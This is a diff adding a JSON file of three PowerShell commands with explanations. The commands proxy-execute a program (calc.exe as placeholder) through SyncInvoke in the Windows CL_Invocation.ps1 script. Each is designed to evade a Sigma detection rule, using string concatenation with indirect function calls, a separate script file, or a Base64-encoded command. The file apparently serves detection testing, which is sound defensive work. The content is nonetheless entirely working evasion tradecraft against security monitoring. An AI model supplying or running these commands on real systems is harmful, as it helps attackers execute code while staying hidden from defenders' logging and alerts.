@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Import-Module 'C:\\Windows\\diagnostics\\system\\Networking\\CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; Get-Item Function:\\$method | ForEach-Object { & $_ 'calc.exe' ' ' }\"",
+    "explanation": "The original Sigma rule searches for the literal string 'SyncInvoke ' in the command line. This bypass uses string concatenation ('Sync' + 'Invoke') and indirect function invocation via the 'Function:' drive to call the target method. Since 'SyncInvoke' never appears as a continuous string in the process creation logs, the pattern match fails."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -File \"C:\\path\\to\\malicious_script.ps1\"",
+    "explanation": "The Sigma rule is specifically designed to catch inline calls (using -Command or -ScriptBlock) where the function name is visible in the process arguments. By placing the call to SyncInvoke inside a .ps1 script file and executing that file, the string 'SyncInvoke' remains hidden within the file content and does not appear in the process creation command line (Event ID 4688/1), effectively bypassing this specific detection."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SUVYIChHZXQtQ29udGVudCAnQzpcV2luZG93c1xkaWFnbm9zdGljc1xzeXN0ZW1cTmV0d29ya2luZ1xDTF9JbnZvY2F0aW9uLnBzMScpOyBTeW5jSW52b2tlICdjYWxjLmV4ZScgJyAn",
+    "explanation": "The command uses Base64 encoding (-EncodedCommand). Most SIEM rules looking for simple string matches on CommandLine will fail because the string 'SyncInvoke' is transformed into its Base64 equivalent. Unless the SIEM environment automatically decodes and inspects PowerShell commands, this bypasses the string-based detection."
+  }
+]
